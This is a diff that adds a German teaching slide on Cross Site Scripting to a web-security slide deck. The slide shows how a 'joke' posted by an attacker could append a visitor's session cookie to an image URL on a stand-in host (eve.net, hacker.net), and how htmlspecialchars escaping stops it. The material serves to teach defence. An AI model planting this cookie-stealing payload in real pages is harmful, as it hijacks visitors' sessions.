@@ -255,7 +255,51 @@ EOM;
 </div>
 <div class="slide">
 
-<h2 id="siehe-auch">Siehe auch</h2>
+<h2 id="cross-site-scripting">Cross Site Scripting</h2>
+
+<p>Wenn das Escaping auf einer Webseite fehlt kann das auch für eine Attacke
+ausgenutzt werden, man nennt das “Cross Site Scripting”.  Bei dieser Attacke
+braucht mein drei Personen:</p>
+
+<ul>
+  <li>Anna betreibt eine Webseite für Witze, jeder kann dort einen Witz hochladen</li>
+  <li>Eve hat einen Witz mit zusätzlichem Code hinterlassen - sie ist die Angreiferin</li>
+  <li>Bernhard kommt vorbei und liest Witze - er ist das Opfer</li>
+</ul>
+
+<p>So könnte der “Witz” aussehen, den Eve eingibt:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+JavaScript ist doof!
+&lt;img src=&quot;http://eve.net/bild.php&quot; alt=&quot;harmlos&quot; id=&quot;hack_tool&quot; /&gt;
+&lt;script&gt;
+document.getElementById(&quot;hack_tool&quot;).src += &quot;?c=&quot; + document.cookie;
+&lt;/script&gt;
+</pre></div>
+
+<p>Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+JavaScript ist doof!
+&lt;img id=&quot;hack_tool&quot; alt=&quot;harmloses bild&quot;
+src=&quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&quot;/&gt;
+</pre></div>
+
+<p>Wenn nun Bernhard diesen Witz liest, dann wird sein Cookie an den Server von Eve gesendet.</p>
+
+<p>Hätte Anna <code>htmlspecialchars</code> bei der Ausgabe verwendet, so wäre das Bild nie als
+Bild angezeigt worden, sondern als</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+JavaScript ist doof!
+&amp;lt;img id=&amp;quot;hack_tool&amp;quot; alt=&amp;quot;harmloses bild&amp;quot;
+src=&amp;quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&amp;quot;/&amp;gt;
+</pre></div>
+
+<p>Escaping ist also ein wichtige Maßnahme gegen Cross Site Scripting.</p>
 
 <ul>
   <li>Kapitel über <a href="/security/a3-injection/#slide-7">Cross Site Scripting (XSS)</a></li>
